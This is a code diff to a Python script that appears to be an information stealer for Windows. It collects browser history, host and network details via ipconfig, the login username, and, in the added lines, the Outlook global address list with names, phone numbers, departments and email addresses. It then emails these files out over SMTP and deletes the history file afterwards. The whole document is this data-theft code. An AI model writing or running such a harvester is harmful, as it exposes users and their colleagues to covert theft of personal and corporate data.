@@ -14,6 +14,8 @@ import os
 import sys
 import platform
 import time
+import win32com.client
+
 
 startTime = time.time()
 
@@ -102,9 +104,48 @@ outputs = get_history()
 outputs.save("C:\\tmp\\history.csv")
 print('Browser history saved successfully.')
 
+#Get list of email contacts and saves to txt file
+print("Grabbing list of Microsoft Outlook contacts on device")
+
+outApp = win32com.client.gencache.EnsureDispatch("Outlook.Application")
+outGAL = outApp.Session.GetGlobalAddressList()
+entries = outGAL.AddressEntries
+
+data_set = list()
+
+for entry in entries:
+    if entry.Type == "EX":
+        user = entry.GetExchangeUser()
+        if user is not None:
+            if len(user.FirstName) > 0 and len(user.LastName) > 0:
+                row = list()
+                row.append(user.FirstName)
+                row.append(user.LastName)
+                row.append(user.MobileTelephoneNumber)
+                row.append(user.BusinessTelephoneNumber)
+                row.append(user.CompanyName)
+                row.append(user.Department)
+                row.append(user.PrimarySmtpAddress)
+                """print("First Name: " + user.FirstName)
+                print("Last Name: " + user.LastName)
+                print("Mobile Phone Number: " + user.MobileTelephoneNumber)
+                print("Business Phone Number: " + user.LastName)
+                print("Company Name: " + user.CompanyName)
+                print("Departement: " + user.Department)
+                print("Email: " + user.PrimarySmtpAddress)"""
+                data_set.append(row)
+
+f = open('C:\\tmp\\email_contacts.txt', 'w')
+f.write(str(data_set))
+f.close()
+
 #Email Content
 print('Assigning Email Content...')
+
+user = os.getlogin()
+
 email_content = f"Device Name: {hostname}\n"
+email_content = f"Username: {user}\n"
 email_content += f"Operating System: {my_os}, {my_os_extra}\n\n\n"
 email_content += f"TIMEZONE INFO\n\n"
 email_content += f"System Timezone: {local_tzname}\n"
@@ -130,10 +171,9 @@ email_content += f"Mapping Network Using ipconfig command:\n\n"
 email_content += f"{ipconfig}"
 
 #Send the Email
-
-sender = "email@gmail.com"
+sender = "youremail@email.com"
 recipient = sender
-app_password = "App password goes here"
+app_password = "app password goes here"
 
 print('Delivering Email...')
 msg = EmailMessage()
@@ -144,6 +184,9 @@ msg["To"] = recipient
 
 with open('C:\\tmp\\history.csv', 'rb') as csv:
     msg.add_attachment(csv.read(), maintype='application', subtype='octet-stream', filename=csv.name)
+
+with open('C:\\tmp\\email_contacts.txt', 'rb') as txt:
+    msg.add_attachment(txt.read(), maintype='application', subtype='octet-stream', filename=txt.name)    
 
 context=ssl.create_default_context()
 
@@ -156,4 +199,4 @@ print('Email delivery successful.')
 print('Deleting history.csv from C:\\tmp\\...')
 os.remove('C:\\tmp\\history.csv')
 executionTime = (time.time() - startTime)
-print('Script completed in ' + str(executionTime), ' Seconds')
+print('Script completed in: ' + str(executionTime), ' Seconds')
